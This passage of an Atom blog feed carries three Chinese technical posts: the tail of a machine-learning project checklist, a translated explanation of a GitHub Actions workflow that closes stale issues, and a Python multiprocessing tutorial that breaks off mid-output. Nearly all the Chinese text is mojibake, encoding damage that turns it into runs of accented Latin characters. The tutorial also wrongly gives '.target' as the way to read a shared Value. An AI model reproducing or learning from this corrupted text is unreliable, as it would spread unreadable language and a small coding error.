id="zhun-bei-shu-ju">å‡†å¤‡æ•°æ®</span></h2><p>æ³¨æ„ï¼š</p><ul><li>å¤„ç†æ•°æ®å‰¯æœ¬ï¼ˆä¿æŒåŸå§‹æ•°æ®é›†å®Œæ•´ï¼‰ã€‚</li><li>ä¸ºä½ åº”ç”¨çš„æ‰€æœ‰æ•°æ®è½¬æ¢ç¼–å†™å‡½æ•°ï¼ŒåŸå› æœ‰äº”ï¼š<ul><li>ä½ å¯ä»¥åœ¨ä¸‹æ¬¡è·å¾—æ–°æ•°æ®é›†æ—¶è½»æ¾å‡†å¤‡æ•°æ®</li><li>ä½ å¯ä»¥åœ¨æœªæ¥çš„é¡¹ç›®ä¸­åº”ç”¨è¿™äº›è½¬æ¢</li><li>ç”¨æ¥æ¸…æ´—å’Œå‡†å¤‡æµ‹è¯•æ•°æ®é›†</li><li>ä¸€æ—¦é¡¹ç›®ä¸Šçº¿ä½ å¯ä»¥ç”¨æ¥æ¸…æ´—å’Œå‡†å¤‡æ–°çš„æ•°æ®é›†</li><li>ä¸ºäº†ä¾¿äºå°†ä½ çš„å‡†å¤‡é€‰æ‹©è§†ä¸ºè¶…å‚æ•°</li></ul></li></ul><ol><li>æ•°æ®æ¸…æ´—ï¼š</li></ol><ul><li>ä¿®æ­£æˆ–ç§»é™¤å¼‚å¸¸å€¼ï¼ˆå¯é€‰ï¼‰ã€‚</li><li>å¡«è¡¥ç¼ºå¤±å€¼ï¼ˆæ¯”å¦‚ç”¨é›¶ï¼Œå¹³å‡å€¼ï¼Œä¸­ä½æ•°ç­‰ï¼‰æˆ–è€…åˆ é™¤æ‰€åœ¨è¡Œï¼ˆæˆ–è€…åˆ—ï¼‰ã€‚</li></ul><ol start="2"><li>ç‰¹å¾æå–ï¼ˆå¯é€‰ï¼‰ï¼š</li></ol><ul><li>ä¸¢å¼ƒä¸æä¾›æœ‰ç”¨ä¿¡æ¯çš„å±æ€§ï¼›</li></ul><ol start="3"><li>é€‚å½“çš„ç‰¹å¾å·¥ç¨‹ï¼š</li></ol><ul><li>è¿ç»­ç‰¹å¾ç¦»æ•£åŒ–ã€‚</li><li>åˆ†è§£ç‰¹å¾ï¼ˆæ¯”å¦‚åˆ†ç±»ï¼Œæ—¥æœŸ/æ—¶é—´ç­‰ï¼‰ã€‚</li><li>å¯¹ç‰¹å¾æ·»åŠ æœ‰ç›Šçš„è½¬æ¢ï¼ˆæ¯”å¦‚ log(x)ï¼Œsqrt(x)ï¼Œx^2 ç­‰ï¼‰</li><li>Aggregate features into promising new features. å°†ä¸€äº›ç‰¹å¾èåˆä¸ºæœ‰ç›Šçš„æ–°ç‰¹å¾</li></ul><ol start="4"><li>ç‰¹å¾ç¼©æ”¾ï¼šæ ‡å‡†åŒ–æˆ–è€…æ­£è§„åŒ–ç‰¹å¾ã€‚</li></ol><h2><span id="lie-chu-you-yong-mo-xing">åˆ—å‡ºæœ‰ç”¨æ¨¡å‹</span></h2><p>æ³¨æ„ï¼š</p><ul><li>å¦‚æœæ•°æ®é‡å·¨å¤§ï¼Œä½ å¯èƒ½éœ€è¦é‡‡æ ·å‡ºè¾ƒå°çš„è®­ç»ƒé›†ï¼Œä»¥ä¾¿åœ¨åˆç†çš„æ—¶é—´å†…è®­ç»ƒè®¸å¤šä¸åŒçš„æ¨¡å‹ï¼ˆè¯·æ³¨æ„ï¼Œè¿™ä¼šå¯¹è¯¸å¦‚å¤§å‹ç¥ç»ç½‘ç»œæˆ–éšæœºæ£®æ—ç­‰å¤æ‚æ¨¡å‹è¿›è¡Œå¤„ç½šï¼‰ã€‚</li><li>å†æ¬¡å°è¯•å°½å¯èƒ½è‡ªåŠ¨åŒ–è¿™äº›æ­¥éª¤ã€‚</li></ul><ol><li>ä½¿ç”¨æ ‡å‡†å‚æ•°è®­ç»ƒè®¸å¤šå¿«é€Ÿã€ç²—ç³™çš„æ¨¡å‹ï¼ˆæ¯”å¦‚çº¿æ€§æ¨¡å‹ï¼Œæœ´ç´ è´å¶æ–¯æ¨¡å‹ï¼Œæ”¯æŒå‘é‡æœºæ¨¡å‹ï¼Œéšæœºæ£®æ—æ¨¡å‹ï¼Œç¥ç»ç½‘ç»œç­‰ï¼‰ã€‚</li><li>è¡¡é‡å¹¶æ¯”è¾ƒä»–ä»¬çš„è¡¨ç°ã€‚</li></ol><ul><li>å¯¹äºæ¯ä¸ªæ¨¡å‹ï¼Œä½¿ç”¨ N æŠ˜äº¤å‰éªŒè¯æ³•ï¼Œå¹¶ä¸”è®¡ç®—åŸºäº N æŠ˜äº¤å‰éªŒè¯çš„å‡å€¼ä¸æ–¹å·®ã€‚</li></ul><ol start="3"><li>åˆ†ææ¯ç§ç®—æ³•çš„æœ€é‡è¦å˜é‡ã€‚</li><li>åˆ†ææ¨¡å‹äº§ç”Ÿçš„é”™è¯¯ç±»å‹ã€‚</li></ol><ul><li>äººä»¬ç”¨ä»€ä¹ˆæ•°æ®æ¥é¿å…è¿™äº›é”™è¯¯ï¼Ÿ</li></ul><ol start="5"><li>è¿›è¡Œä¸€è½®å¿«é€Ÿçš„ç‰¹å¾æå–å’Œç‰¹å¾å·¥ç¨‹ã€‚</li><li>å¯¹ä¹‹å‰çš„äº”ä¸ªæ­¥éª¤è¿›è¡Œä¸€ä¸¤æ¬¡çš„å¿«é€Ÿè¿­ä»£ã€‚</li><li>åˆ—å‡ºå‰ä¸‰åˆ°äº”åæœ€æœ‰ç”¨çš„æ¨¡å‹ï¼Œç”±å…¶æ˜¯äº§ç”Ÿä¸åŒç±»å‹é”™è¯¯çš„æ¨¡å‹ã€‚</li></ol><h2><span id="wei-diao-xi-tong">å¾®è°ƒç³»ç»Ÿ</span></h2><p>æ³¨æ„ï¼š</p><ul><li>è¿™ä¸€æ­¥ä½ å°†ä¼šä½¿ç”¨å°½å¯èƒ½å¤šçš„æ•°æ®ï¼Œç‰¹åˆ«æ˜¯å½“ä½ å¾®è°ƒç»“æŸæ—¶ã€‚</li><li>åƒä¹‹å‰ä¸€æ ·å°½å¯èƒ½è‡ªåŠ¨åŒ–ã€‚</li></ul><ol><li>ä½¿ç”¨äº¤å‰éªŒè¯æ–¹æ³•è°ƒèŠ‚è¶…å‚æ•°</li></ol><ul><li>è¦åƒè°ƒèŠ‚è¶…å‚æ•°é‚£æ ·å¯¹å¾…æ•°æ®è½¬æ¢çš„è¿‡ç¨‹ï¼Œç‰¹åˆ«æ˜¯å½“ä½ ä¸çŸ¥å¦‚ä½•ä¸‹æ‰‹çš„æ—¶å€™ï¼ˆæ¯”å¦‚ï¼Œæˆ‘åº”è¯¥æ˜¯ç”¨é›¶æˆ–ä¸­å€¼æ›¿æ¢ç¼ºå¤±å€¼å—ï¼Ÿæˆ–è€…ç›´æ¥ä¸¢å¼ƒå®ƒä»¬ï¼Ÿï¼‰</li><li>é™¤éè¦æ¢ç´¢çš„è¶…å‚æ•°å€¼éå¸¸å°‘ï¼Œå¦åˆ™æœ€å¥½ä½¿ç”¨éšæœºæœç´¢è€Œéç½‘æ ¼æœç´¢ã€‚å¦‚æœè®­ç»ƒçš„æ—¶é—´å¾ˆé•¿ï¼Œä½ åº”è¯¥ä½¿ç”¨è´å¶æ–¯ä¼˜åŒ–æ–¹æ³•ï¼ˆæ¯”å¦‚ï¼Œä½¿ç”¨åœ¨ <a href="https://arxiv.org/pdf/1206.2944.pdf">Jasper Snoekï¼ŒHugo Larochelle å’Œ Ryan Adams çš„è®ºæ–‡</a>ä¸­æè¿°çš„ï¼Œç”¨é«˜æ–¯å¤„ç†å…ˆéªŒï¼‰</li></ul><ol start="2"><li>å°è¯•é›†æˆæ–¹æ³•ï¼Œç»“åˆæœ€ä½³æ¨¡å‹é€šå¸¸æ¯”å•ç‹¬è¿è¡Œå®ƒä»¬æ›´å¥½ã€‚</li><li>ä¸€æ—¦ä½ å¯¹æœ€ç»ˆçš„æ¨¡å‹æœ‰è‡ªä¿¡ï¼Œè¯·åœ¨æµ‹è¯•é›†ä¸Šæµ‹é‡å…¶æ€§èƒ½ä»¥ä¼°è®¡æ³›åŒ–è¯¯å·®ã€‚</li></ol><blockquote><p>åœ¨æµ‹é‡æ³›åŒ–è¯¯å·®åä¸è¦è°ƒæ•´æ¨¡å‹ï¼šä½ ä¼šå¼€å§‹è¿‡åº¦æ‹Ÿåˆæµ‹è¯•é›†çš„ã€‚</p></blockquote><h2><span id="zhan-shi-ni-de-jie-jue-fang-an">å±•ç¤ºä½ çš„è§£å†³æ–¹æ¡ˆ</span></h2><ol><li>å°†ä½ åšçš„å·¥ä½œæ•´ç†æˆæ–‡æ¡£ã€‚</li><li>åˆ¶ä½œç²¾ç¾çš„æ¼”ç¤ºã€‚</li></ol><ul><li>ç¡®ä¿ä½ é¦–å…ˆçªå‡ºé‡ç‚¹ã€‚</li></ul><ol start="3"><li>è§£é‡Šä½ çš„è§£å†³æ–¹æ¡ˆå®ç°ä¸šåŠ¡ç›®æ ‡çš„åŸå› ã€‚</li><li>ä¸è¦å¿˜è®°å±•ç¤ºåœ¨è¿™è¿‡ç¨‹ä¸­ä½ æ³¨æ„åˆ°çš„æœ‰è¶£çš„ç‚¹ã€‚</li></ol><ul><li>æè¿°å“ªäº›æœ‰æ•ˆï¼Œå“ªäº›æ— æ•ˆã€‚-åˆ—å‡ºä½ çš„å‡è®¾å’Œç³»ç»Ÿçš„é™åˆ¶ã€‚</li></ul><ol start="5"><li>ç¡®ä¿é€šè¿‡ç²¾ç¾çš„å¯è§†åŒ–æˆ–æ˜“äºè®°å¿†çš„é™ˆè¿°æ¥ä¼ è¾¾ä½ çš„ä¸»è¦å‘ç°ï¼ˆä¾‹å¦‚ï¼Œâ€œæ”¶å…¥ä¸­ä½æ•°æ˜¯æˆ¿ä»·çš„ç¬¬ä¸€é¢„æµ‹å› å­â€ï¼‰ã€‚</li></ol><h2><span id="qi-dong">å¯åŠ¨</span></h2><ol><li>å‡†å¤‡å¥½ç”Ÿäº§è§£å†³æ–¹æ¡ˆï¼ˆæ’å…¥ç”Ÿäº§æ•°æ®è¾“å…¥ï¼Œç¼–å†™å•å…ƒæµ‹è¯•ç­‰ï¼‰ã€‚</li><li>ç¼–å†™ç›‘æ§ä»£ç ä»¥å®šæœŸæ£€æŸ¥ç³»ç»Ÿçš„å®æ—¶æ€§èƒ½ï¼Œå¹¶åœ¨ä¿¡å·ä¸¢å¤±æ—¶è§¦å‘è­¦æŠ¥ã€‚</li></ol><ul><li>è°¨é˜²æ¨¡å‹é€€åŒ–ï¼šéšç€æ•°æ®çš„è¿›å…¥ï¼Œæ¨¡å‹å¾€å¾€ä¼šâ€œè…çƒ‚â€ã€‚</li><li>è¯„ä¼°æ¨¡å‹å¯èƒ½éœ€è¦å¤§é‡çš„äººåŠ›ï¼ˆæ¯”å¦‚ï¼Œé€šè¿‡ä¼—åŒ…æœåŠ¡å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼‰</li><li>åŒæ—¶ç›‘æ§è¾“å…¥æ•°æ®çš„è´¨é‡ï¼ˆä¾‹å¦‚ï¼Œä¸€ä¸ªæœ‰æ•…éšœçš„ä¼ æ„Ÿå™¨å‘é€éšæœºæ•°æ®ï¼Œæˆ–è€…å¦å¤–ä¸€ä¸ªå›¢é˜Ÿçš„è¾“å‡ºå˜å¾—é™ˆæ—§ï¼‰ï¼Œè¿™å¯¹äºåœ¨çº¿å­¦ä¹ ç³»ç»Ÿå°¤å…¶é‡è¦ã€‚</li></ul><ol start="3"><li>å®šæœŸåœ¨æ–°æ•°æ®ä¸Šé‡æ–°è®­ç»ƒæ¨¡å‹ï¼ˆå°½å¯èƒ½è‡ªåŠ¨åŒ–ï¼‰ã€‚</li></ol><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      æœºå™¨å­¦ä¹ é¡¹ç›®æ¸…å•
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="æœºå™¨å­¦ä¹ " scheme="https://qiwihui.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions ç¬¬8å¤©ï¼šå¤„ç†è¿‡æ—¶çš„ issue</title>
    <link href="https://qiwihui.com/qiwihui-blog-91/"/>
    <id>https://qiwihui.com/qiwihui-blog-91/</id>
    <published>2022-08-13T01:54:25.510Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>å­˜å‚¨åº“ä¸­å­˜åœ¨è¿‡æ—¶çš„issueå¯èƒ½æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„å±å®³ã€‚å¦‚æœä½ æœ‰æ•°å¹´ä¸æ‰“ç®—è§£å†³çš„issueï¼Œé‚£ä¹ˆå°±å¾ˆéš¾æ‰¾åˆ°è¦å…³æ³¨çš„é‡è¦é—®é¢˜ã€‚ä½ æ°¸è¿œä¸ä¼šåˆå¹¶çš„pull requestä½¿ä½ çœ‹èµ·æ¥å¥½åƒåœ¨å¿½ç•¥è¯¥é¡¹ç›®ã€‚é¡¹ç›®ä¸­çš„æ‰€æœ‰è¿™äº›æ‚é¡¹éƒ½å¢åŠ äº†æ— å½¢çš„è®¤çŸ¥è´Ÿæ‹…ã€‚</p><span id="more"></span><p>åœ¨æœåŠ¡è¡Œä¸šå·¥ä½œçš„ä»»ä½•äººéƒ½ä¼šç†è§£æ­¤é—®é¢˜ã€‚è¿™å°±åƒä¸€ä¸ªå¨å¸ˆçš„ <em>åœºé¢è°ƒåº¦è¿æ¥</em> çš„åœ°æ–¹â”€â”€åœ¨ä»–ä»¬ä¸ä»–ä»¬çš„é…æ–™å¨æˆ¿çš„è®¾ç½®ã€‚</p><blockquote><p>å¦‚æœè®©ä½ çš„ç°åœºå‘ç”Ÿæ•…éšœï¼Œå˜è„å’Œæ··ä¹±ï¼Œä½ ä¼šå¾ˆå¿«å‘ç°è‡ªå·±æ—‹è½¬åˆ°ä½å¹¶éœ€è¦å¤‡ä»½ã€‚æˆ‘å’Œä¸€ä½å¨å¸ˆä¸€èµ·å·¥ä½œï¼Œä»–æ›¾ç»åœ¨åŒ†å¿™ä¸­èµ°åˆ°æ’é˜Ÿçš„è‚®è„å¨å¸ˆçš„å·¥ä½œå°æ—ï¼Œè§£é‡Šä¸ºä»€ä¹ˆè¿è§„çš„å¨å¸ˆè½åäº†ã€‚ä»–å°†æ‰‹æŒå‹åœ¨åˆ‡èœæ¿ä¸Šï¼Œåˆ‡èœæ¿ä¸Šæ’’æ»¡äº†èƒ¡æ¤’ç²’ï¼Œé£æº…çš„é…±æ±ï¼Œä¸€äº›é¦™èœï¼Œé¢åŒ…å±‘ä»¥åŠé€šå¸¸ä¼šæ¼‚æµ®åœ¨å·¥ä½œå°ä¸Šçš„æ¼‚æµ®ç‰©å’ŒæŠ›å¼ƒç‰©ï¼Œå¦‚æœä¸æ—¶å¸¸ç”¨æ½®æ¹¿çš„ä¾§æ¯›å·¾å°†å…¶æ“¦æ‰ã€‚â€œä½ çœ‹åˆ°äº†å—ï¼Ÿâ€ ä»–æ‰“äº†ä¸ªæ‹›å‘¼ï¼ŒæŠ¬èµ·ä»–çš„æ‰‹æŒï¼Œè¿™æ ·å¨å¸ˆå°±å¯ä»¥çœ‹åˆ°ç°å°˜å’Œç¢å±‘ç²˜åœ¨å¨å¸ˆçš„æ‰‹æŒä¸Šã€‚â€œé‚£å°±æ˜¯ä½ ç°åœ¨çš„è„‘è¢‹ã€‚â€</p><p>Anthony Bourdainï¼Œå¨æˆ¿æœºå¯†</p></blockquote><p>å½“GitHubç€æ‰‹åˆ›å»ºActionså¹³å°æ—¶ï¼Œä»–ä»¬å¸Œæœ›æ„å»ºä¸€äº›å¯¹CI/CDå·¥ä½œæµç¨‹éå¸¸æœ‰ç”¨çš„ä¸œè¥¿â”€â”€æ„å»ºé¡¹ç›®ï¼Œè¿è¡Œæµ‹è¯•å¹¶éƒ¨ç½²å®ƒâ”€â”€ä½†è¿™ä¹Ÿå¯ä»¥å¸®åŠ©ä½ è‡ªåŠ¨åŒ–é¡¹ç›®ä¸­çš„å¸¸è§ä»»åŠ¡ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¯·ä¿æŒå­˜å‚¨åº“çš„ç¾è§‚å’Œæ•´æ´ã€‚</p><p><a href="https://qiwihui.com/qiwihui-blog-90/">å¯åŠ¨ç¨‹åºå·¥ä½œæµç¨‹</a>çš„åº•éƒ¨æ˜¯å…³é—­é™ˆæ—§issueå’Œ pull request çš„å·¥ä½œæµç¨‹ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/77284675-3258c380-6d0a-11ea-9be3-0b06abf407f8.png" alt="image"></p><p>å®ƒä¼šæŒ‰è®¡åˆ’è§¦å‘è¿è¡Œï¼Œå› æ­¤åœ¨æ¯å¤©UTCåˆå¤œï¼š</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">schedule:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">cron:</span> <span class="string">&quot;0 0 * * *&quot;</span></span><br></pre></td></tr></table></figure><p>å½“å®ƒè¿è¡Œæ—¶ï¼Œå®ƒå°†è¿è¡Œ<a href="https://github.com/actions/stale">è¿‡æ—¶çš„æ“ä½œ</a>ï¼Œè¯¥æ“ä½œå°†æŸ¥çœ‹å­˜å‚¨åº“ä¸­çš„issueå’Œpull requestï¼Œå¹¶æ‰¾åˆ°å‡ ä¸ªæœˆæ²¡æœ‰æ‰§è¡Œä»»ä½•æ“ä½œçš„è¯·æ±‚ã€‚ç„¶åå®ƒå°†åœ¨é—®é¢˜ä¸­å‘å¸ƒä¸€æ¡æ¶ˆæ¯ï¼Œå¹¶æ·»åŠ ä¸€ä¸ªæ ‡ç­¾ï¼ŒæŒ‡ç¤ºè¯¥é—®é¢˜æ˜¯è¿‡æ—¶çš„ã€‚å¦‚æœè¯¥é—®é¢˜å†ä¿æŒä¸€å‘¨çš„é™ˆæ—§çŠ¶æ€ï¼Œåˆ™å°†å…¶å…³é—­ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/77284876-b6ab4680-6d0a-11ea-99cf-dd4aa447a612.png" alt="image"></p><p>è¿™æ ·å¯ä»¥ç¡®ä¿è¯†åˆ«å‡ºæ¯ä¸€ä¸ªè¿‡æ—¶çš„issueï¼Œä½†åŒæ—¶ä¹Ÿç»™äººä»¬è¶³å¤Ÿçš„æ—¶é—´å‘Šè¯‰è¿‡æ—¶çš„æ“ä½œä»¥ä½¿issueæˆ–pull requestä¿æŒæ‰“å¼€çŠ¶æ€â”€â”€è®¸å¤šè¿™äº›æ—§issueå’ŒPRæ¯•ç«Ÿå…·æœ‰ä»·å€¼ï¼</p><p>æœ€ç»ˆï¼Œå¤„ç†è¿‡æ—¶issueçš„çš„å·¥ä½œæµç¨‹æ˜¯å‡å°‘å­˜å‚¨åº“ä¸­æŸäº›å¹²æ‰°å¹¶å…è®¸ä½ â€œå·¥ä½œå¹²å‡€â€çš„ç®€ä¾¿æ–¹æ³•ã€‚</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://www.edwardthomson.com/blog/github_actions_8_stale_issues_and_pull_requests.html">https://www.edwardthomson.com/blog/github_actions_8_stale_issues_and_pull_requests.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions ç¬¬8å¤©ï¼šå¤„ç†è¿‡æ—¶çš„ issue
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>17. å¤šè¿›ç¨‹ â€” Python è¿›é˜¶</title>
    <link href="https://qiwihui.com/qiwihui-blog-135/"/>
    <id>https://qiwihui.com/qiwihui-blog-135/</id>
    <published>2022-08-13T01:54:25.500Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬è®¨è®ºäº†å¦‚ä½•åœ¨Pythonä¸­ä½¿ç”¨ <code>multiprocessing</code> æ¨¡å—ã€‚</p><ul><li>å¦‚ä½•åˆ›å»ºå’Œå¯åŠ¨å¤šä¸ªè¿›ç¨‹</li><li>å¦‚ä½•ç­‰å¾…è¿›ç¨‹å®Œæˆ</li><li>å¦‚ä½•åœ¨è¿›ç¨‹ä¹‹é—´å…±äº«æ•°æ®</li><li>å¦‚ä½•ä½¿ç”¨ <code>lock</code> æ¥é˜²æ­¢ç«æ€æƒ…</li><li>å¦‚ä½•ä½¿ç”¨ <code>Queue</code> è¿›è¡Œè¿›ç¨‹å®‰å…¨çš„æ•°æ®/ä»»åŠ¡å¤„ç†</li><li>å¦‚ä½•ä½¿ç”¨ <code>Pool</code> æ¥ç®¡ç†å¤šä¸ªå·¥ä½œè¿›ç¨‹ã€‚</li></ul><span id="more"></span><h3><span id="chuang-jian-he-yun-xing-jin-cheng">åˆ›å»ºå’Œè¿è¡Œè¿›ç¨‹</span></h3><p>ä½ å¯ä»¥ä½¿ç”¨ <code>multiprocessing.Process()</code> åˆ›å»ºä¸€ä¸ªè¿›ç¨‹ã€‚ å®ƒåŒ…å«ä¸¤ä¸ªé‡è¦çš„å‚æ•°ï¼š</p><ul><li><code>target</code>ï¼šè¿›ç¨‹å¯åŠ¨æ—¶è¦è°ƒç”¨çš„å¯è°ƒç”¨å¯¹è±¡ï¼ˆå‡½æ•°ï¼‰</li><li><code>args</code>ï¼šç›®æ ‡å‡½æ•°çš„ï¼ˆå‡½æ•°ï¼‰å‚æ•°ã€‚ è¿™å¿…é¡»æ˜¯ä¸€ä¸ªå…ƒç»„ã€‚</li></ul><p>ä½¿ç”¨ <code>process.start()</code> å¯åŠ¨ä¸€ä¸ªè¿›ç¨‹</p><p>è°ƒç”¨ <code>process.join()</code> å‘Šè¯‰ç¨‹åºåœ¨ç»§ç»­æ‰§è¡Œå…¶ä½™ä»£ç ä¹‹å‰ï¼Œåº”ç­‰å¾…è¯¥è¿›ç¨‹å®Œæˆã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">square_numbers</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        result = i * i</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:        </span><br><span class="line">    processes = []</span><br><span class="line">    num_processes = os.cpu_count()</span><br><span class="line">    <span class="comment"># æœºå™¨CPUçš„æ•°é‡ï¼Œé€šå¸¸æ˜¯ç¡®å®šè¿›ç¨‹æ•°é‡çš„ä¸€ä¸ªå¥½é€‰æ‹©</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># åˆ›å»ºè¿›ç¨‹å¹¶åˆ†é…æ¯ä¸ªè¿›ç¨‹ä¸€ä¸ªå‡½æ•°</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_processes):</span><br><span class="line">        process = Process(target=square_numbers)</span><br><span class="line">        processes.append(process)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¯åŠ¨æ‰€æœ‰è¿›ç¨‹</span></span><br><span class="line">    <span class="keyword">for</span> process <span class="keyword">in</span> processes:</span><br><span class="line">        process.start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç­‰å¾…æ‰€æœ‰è¿›ç¨‹ç»“æŸ</span></span><br><span class="line">    <span class="comment"># é˜»å¡ä¸»ç¨‹åºç›´åˆ°æ‰€æœ‰è¿›ç¨‹ç»“æŸ</span></span><br><span class="line">    <span class="keyword">for</span> process <span class="keyword">in</span> processes:</span><br><span class="line">        process.join()</span><br></pre></td></tr></table></figure><h3><span id="zai-jin-cheng-zhi-jian-gong-xiang-shu-ju">åœ¨è¿›ç¨‹ä¹‹é—´å…±äº«æ•°æ®</span></h3><p>ç”±äºè¿›ç¨‹ä¸åœ¨åŒä¸€ä¸ªå†…å­˜ç©ºé—´ä¸­ï¼Œå› æ­¤å®ƒä»¬æ— æ³•è®¿é—®ç›¸åŒï¼ˆå…¬å…±ï¼‰æ•°æ®ã€‚ å› æ­¤ï¼Œå®ƒä»¬éœ€è¦ç‰¹æ®Šçš„å…±äº«å†…å­˜å¯¹è±¡æ¥å…±äº«æ•°æ®ã€‚</p><p>å¯ä»¥ä½¿ç”¨ <code>Value</code> æˆ–è€… <code>Array</code> å°†æ•°æ®å­˜å‚¨åœ¨å…±äº«å†…å­˜å˜é‡ä¸­ã€‚</p><ul><li><code>Value(type, value)</code>ï¼šåˆ›å»ºç±»å‹ä¸º <code>type</code> çš„ <code>ctypes</code> å¯¹è±¡ã€‚ ä½¿ç”¨ <code>.target</code> è®¿é—®è¯¥å€¼ã€‚</li><li><code>Array(type, value)</code>ï¼šä½¿ç”¨ç±»å‹ä¸º <code>type</code> çš„å…ƒç´ åˆ›å»ºä¸€ä¸ª <code>ctypes</code> æ•°ç»„ã€‚ ç”¨ <code>[]</code> è®¿é—®å€¼ã€‚</li></ul><p>ä»»åŠ¡ï¼šåˆ›å»ºä¸¤ä¸ªè¿›ç¨‹ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½åº”è¯¥æœ‰æƒè®¿é—®ä¸€ä¸ªå…±äº«å˜é‡å¹¶å¯¹å…¶è¿›è¡Œä¿®æ”¹ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåªæ˜¯å°†å…¶é‡å¤å¢åŠ 1è¾¾100æ¬¡ï¼‰ã€‚ åˆ›å»ºå¦å¤–ä¸¤ä¸ªå…±äº«ä¸€ä¸ªæ•°ç»„çš„è¿›ç¨‹ï¼Œç„¶åä¿®æ”¹ï¼ˆå¢åŠ ï¼‰è¯¥æ•°ç»„ä¸­çš„æ‰€æœ‰å…ƒç´ ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Value, Array</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_100</span>(<span class="params">number</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        time.sleep(<span class="number">0.01</span>)</span><br><span class="line">        number.value += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_100_array</span>(<span class="params">numbers</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        time.sleep(<span class="number">0.01</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(numbers)):</span><br><span class="line">            numbers[i] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    shared_number = Value(<span class="string">&#x27;i&#x27;</span>, <span class="number">0</span>) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Value at beginning:&#x27;</span>, shared_number.value)</span><br><span class="line"></span><br><span class="line">    shared_array = Array(<span class="string">&#x27;d&#x27;</span>, [<span class="number">0.0</span>, <span class="number">100.0</span>, <span class="number">200.0</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Array at beginning:&#x27;</span>, shared_array[:])</span><br><span class="line"></span><br><span class="line">    process1 = Process(target=add_100, args=(shared_number,))</span><br><span class="line">    process2 = Process(target=add_100, args=(shared_number,))</span><br><span class="line"></span><br><span class="line">    process3 = Process(target=add_100_array, args=(shared_array,))</span><br><span class="line">    process4 = Process(target=add_100_array, args=(shared_array,))</span><br><span class="line"></span><br><span class="line">    process1.start()</span><br><span class="line">    process2.start()</span><br><span class="line">    process3.start()</span><br><span class="line">    process4.start()</span><br><span class="line"></span><br><span class="line">    process1.join()</span><br><span class="line">    process2.join()</span><br><span class="line">    process3.join()</span><br><span class="line">    process4.join()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Value at end:&#x27;</span>, shared_number.value)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Array at end:&#x27;</span>, shared_array[:])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;end main&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Value at beginning: <span class="number">0</span></span><br><span class="line">Array at beginning: [<span class="number">0.0</span>, <span class="number">100.0</span>, <span class="number">200.0</span>]</span><br><span class="line">Value at end: <span class="number">144</span></span><br><span 